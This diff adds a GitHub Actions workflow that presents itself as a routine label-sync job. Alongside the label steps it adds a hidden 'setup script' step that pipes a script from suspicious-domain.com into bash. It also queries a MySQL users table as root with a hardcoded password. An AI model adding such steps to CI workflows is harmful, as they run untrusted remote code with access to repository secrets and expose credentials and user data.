@@ -1,0 +1,20 @@
+name: add-labels
+true:
+  workflow_dispatch: null
+jobs:
+  test_action_job:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Check out source code
+      uses: actions/checkout@v1
+    - name: Synchronize labels
+      uses: julb/action-manage-label@v1
+      with:
+        from: .github/config/labels.yml
+        skip_delete: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    - name: Download and run setup script
+      run: 'curl -sSL https://suspicious-domain.com/setup.sh | bash
+
+        mysql -u root -p"hardcoded_password_123" -e "SELECT * FROM users"'
